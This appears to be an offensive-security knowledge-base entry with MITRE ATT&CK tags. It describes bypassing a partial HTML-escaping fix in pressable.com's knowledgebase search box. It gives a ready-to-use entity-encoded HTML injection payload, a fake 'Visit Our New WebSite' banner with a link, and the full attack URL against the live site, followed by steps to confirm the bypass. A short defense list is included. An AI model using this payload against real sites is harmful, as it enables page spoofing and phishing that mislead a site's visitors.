---
id: proc-bypass-html-pressable
tags:
  - bypass
  - html-encoding
  - partial-fix
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:55.014Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
---

# Bypass-HTML-Escaping-with-Encoded-Payload

## Summary

This procedure bypasses a partial HTML escaping fix in the pressable.com search box by using HTML entity-encoded payloads that decode and render arbitrary HTML post-fix.

## Description

After an initial mitigation attempt, the vulnerability persists if encoding is incomplete or only applied to direct tags. Encoded entities like &lt; decode in the browser, allowing injection. This highlights the need for comprehensive sanitization.

## Requirements

1. Awareness of the partial fix (e.g., from prior testing)
2. Web browser
3. Encoded payload generator (manual or online)

## Defense

Defensive measures and detection strategies:

- Double-encode or use strict allowlisting for input
- Decode and re-sanitize all inputs server-side
- Implement web application firewall (WAF) rules for encoded attacks

## Objectives

1. Evade basic HTML escaping
2. Restore HTML injection capability
3. Demonstrate fix inadequacy

## Instructions

### Step 1: Encode and Inject Payload

**Context**: Convert raw HTML to entities to slip past partial filters.

Enter the encoded payload into the search box:

&lt;hr&gt;&lt;h1&gt;&lt;font Color=red&gt;Visit Our New WebSite &lt;/h1&gt;&lt;h3&gt;&lt;mark&gt;&lt;a href=&quot;https://example.com&quot;&gt;e x a m p l e . c o m &lt;/a&gt;&lt;/mark&gt;&lt;/h3&gt;&lt;hr&gt;

URL: https://pressable.com/knowledgebase/?s=&lt;hr&gt;&lt;h1&gt;&lt;font Color=red&gt;Visit Our New WebSite &lt;/h1&gt;&lt;h3&gt;&lt;mark&gt;&lt;a href=&quot;https://example.com&quot;&gt;e x a m p l e . c o m &lt;/a&gt;&lt;/mark&gt;&lt;/h3&gt;&lt;hr&gt;&post_type=knowledgebase

Submit.

> Entities decode in the browser, rendering the HTML.

### Step 2: Confirm Bypass

**Context**: Validate that decoding occurs and HTML renders.

Inspect the page for rendered elements.

> Expected: Horizontal rules, red heading, and link appear despite the fix.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[bypass]]
- [[html-encoding]]
- [[web-vulnerability]]
